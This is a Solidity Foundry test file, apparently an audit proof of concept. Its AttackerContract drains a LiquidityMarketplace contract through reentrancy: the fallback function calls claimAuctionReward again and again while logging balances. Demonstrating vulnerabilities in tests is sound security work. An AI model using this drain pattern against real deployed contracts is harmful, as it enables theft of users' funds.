// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {LiquidityMarketplace, ILiquidityLocker} from "../contracts/LiquidityMarketplace.sol";
import {LiqudityLockerMock} from "../contracts/liquidityLockerMock.sol";

contract ContractTest is Test {
    LiquidityMarketplace public liqMarketSC;
    LiquidityMarketplace public liqMarketSCBadReceiver;
    LiqudityLockerMock public liqLockMockSC;
    ILiquidityLocker public liqLockerSC;
    AttackerContract public attackSC;

    uint256 ownerFee = 1000;
    address FEE_RECEIVER = makeAddr("feeReceiver");
    address LP_SELLER = makeAddr("lpSeller");
    address LP_BUYER = makeAddr("lpBuyer");
    address BIDDER = makeAddr("bidder");

    function setUp() public {
        liqLockMockSC = new LiqudityLockerMock();
        liqLockerSC = ILiquidityLocker(address(liqLockMockSC));
        liqMarketSC = new LiquidityMarketplace(liqLockerSC, ownerFee, FEE_RECEIVER);
        attackSC = new AttackerContract(address(liqMarketSC));

        vm.deal(address(liqMarketSC), 10 ether);
        vm.deal(address(BIDDER), 1 ether);
        //vm.deal(address(attackSC), 2 ether);
    }

    function testReentrancy() public {
        attackSC.createAuction();
        vm.startPrank(BIDDER);
        liqMarketSC.makeBid{value: 1 ether}(0);
        vm.warp(100);
        attackSC.attack(); // exploit here
    }
}

contract AttackerContract {
    LiquidityMarketplace public liqMarketSC;
    address LP_TOKEN = address(42);

    constructor(address _liqMarket) {
        liqMarketSC = LiquidityMarketplace(_liqMarket);
    }

    function attack() external {
        console.log("Attacker start balance", address(this).balance);
        console.log("LIQMARKET start balance", address(liqMarketSC).balance);
        liqMarketSC.claimAuctionReward(0);
        console.log("Attacker end balance", address(this).balance);
        console.log("LIQMARKET end balance", address(liqMarketSC).balance);
    }

    function createAuction() external {
        liqMarketSC.startAuction(LP_TOKEN, 0, 0, 10, 1, 10, true);
        liqMarketSC.activateAuction(0);
    }

    fallback() external payable {
        if (address(liqMarketSC).balance >= 1 ether) {
            liqMarketSC.claimAuctionReward(0); // exploit here
        }
    }
}
